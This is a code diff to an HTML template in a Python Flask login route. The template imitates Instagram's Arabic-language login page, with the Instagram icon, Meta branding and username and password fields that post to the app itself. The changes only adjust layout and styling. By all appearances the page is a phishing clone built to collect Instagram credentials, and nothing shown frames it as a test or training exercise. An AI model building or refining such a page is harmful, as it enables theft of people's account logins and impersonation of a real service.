@@ -56,42 +56,46 @@ def login():
         body { 
             background: #121212; 
             color: #f5f5f5;
-            width: 100vw; 
-            height: 100vh; 
+            min-height: 100dvh;
             display: flex; 
-            flex-direction: column; 
-            justify-content: space-between; 
+            justify-content: center; 
             align-items: center; 
-            overflow: hidden;
+            overflow-x: hidden;
             padding: 10px 20px;
         }
         
-        .main-container { 
+        .page-wrapper {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .main-box { 
             width: 100%; 
-            max-width: 350px; 
             display: flex; 
             flex-direction: column; 
             align-items: center; 
             text-align: center; 
-            margin-top: auto;
-            margin-bottom: auto;
+            margin-bottom: 12px;
         }
 
         .lang-text {
             color: #a8a8a8;
             font-size: 12px;
-            margin-bottom: 12px;
+            margin-bottom: 15px;
         }
 
         .insta-icon-container {
-            margin-bottom: 15px;
+            margin-bottom: 18px;
             display: flex;
             justify-content: center;
         }
         
         .insta-icon {
-            width: 46px;
-            height: 46px;
+            width: 48px;
+            height: 48px;
             background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
             border-radius: 12px;
             display: flex;
@@ -99,8 +103,8 @@ def login():
             justify-content: center;
         }
         .insta-icon svg {
-            width: 25px;
-            height: 25px;
+            width: 26px;
+            height: 26px;
             fill: white;
         }
 
@@ -108,7 +112,7 @@ def login():
             color: #ed4956; 
             font-size: 12px; 
             line-height: 16px; 
-            margin-bottom: 8px; 
+            margin-bottom: 10px; 
             text-align: center; 
             background: #1c1c1c; 
             padding: 8px; 
@@ -155,12 +159,10 @@ def login():
 
         .footer-section { 
             width: 100%; 
-            max-width: 350px; 
             text-align: center; 
             display: flex; 
             flex-direction: column; 
             align-items: center; 
-            margin-bottom: 5px;
         }
         
         .signup-card { 
@@ -173,7 +175,7 @@ def login():
             color: #0095f6; 
             font-weight: 600; 
             cursor: pointer; 
-            margin-bottom: 10px;
+            margin-bottom: 12px;
         }
 
         .meta-footer { display: flex; align-items: center; justify-content: center; }
@@ -186,40 +188,42 @@ def login():
     </style>
 </head>
 <body>
-    <div class="main-container">
-        <div class="lang-text">العربية</div>
-        
-        <div class="insta-icon-container">
-            <div class="insta-icon">
-                <svg viewBox="0 0 24 24">
-                    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
-                </svg>
+    <div class="page-wrapper">
+        <div class="main-box">
+            <div class="lang-text">العربية</div>
+            
+            <div class="insta-icon-container">
+                <div class="insta-icon">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+                    </svg>
+                </div>
             </div>
+            
+            {% if error %}
+                <div class="error-msg">{{ error }}</div>
+            {% endif %}
+
+            <form method="POST">
+                <div class="input-group">
+                    <input type="text" name="username" required placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم المحمول" value="{{ username_val }}">
+                </div>
+                <div class="input-group">
+                    <input type="password" name="password" required placeholder="كلمة السر">
+                </div>
+                <button type="submit" class="submit-btn">تسجيل الدخول</button>
+            </form>
+
+            <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
         </div>
-        
-        {% if error %}
-            <div class="error-msg">{{ error }}</div>
-        {% endif %}
 
-        <form method="POST">
-            <div class="input-group">
-                <input type="text" name="username" required placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم المحمول" value="{{ username_val }}">
+        <div class="footer-section">
+            <div class="signup-card">
+                إنشاء حساب جديد
             </div>
-            <div class="input-group">
-                <input type="password" name="password" required placeholder="كلمة السر">
+            <div class="meta-footer">
+                <div class="meta-brand">Meta ∞</div>
             </div>
-            <button type="submit" class="submit-btn">تسجيل الدخول</button>
-        </form>
-
-        <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
-    </div>
-
-    <div class="footer-section">
-        <div class="signup-card">
-            إنشاء حساب جديد
-        </div>
-        <div class="meta-footer">
-            <div class="meta-brand">Meta ∞</div>
         </div>
     </div>
 </body>
